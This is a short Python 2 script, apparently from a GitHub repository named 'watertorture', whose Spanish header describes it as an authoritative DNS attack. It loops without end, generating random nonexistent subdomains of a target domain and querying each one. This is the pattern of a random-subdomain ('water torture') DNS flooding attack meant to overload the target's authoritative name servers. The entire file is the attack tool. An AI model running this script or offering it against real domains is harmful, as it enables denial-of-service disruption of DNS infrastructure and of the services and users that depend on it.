#!/usr/bin/python
#Author : Antonio Taboada
#Date: 12/10/2016
#Filename: subdominio.py
#Purpose : Ataque DNS autoritativo con peticion de subdominios aleatorios inexistentes
#From: https://github.com/hackingyseguridad/watertorture/blob/master/subdominio.py 

import dns.resolver
import random
import sys
import socket  

if len(sys.argv) < 2 or len(sys.argv) > 3:
    print "Using: " , sys.argv[0] , " domain "
    exit(0)
elif len(sys.argv) == 2:
    dominio = sys.argv[1]
    try:
        host=socket.gethostbyname(dominio)
    except:
        print "Dominio no valido"
        exit(0)

while 1:
	subdominio = str(random.randrange(10000000))
	url = subdominio+"."+dominio 
	print "Domain:", dominio
	print "IP for Domain:", host
	print "SubDomain:", url

	answers = dns.resolver.query(url)
	for rdata in answers: 
		print "IP SubDomain:", rdata
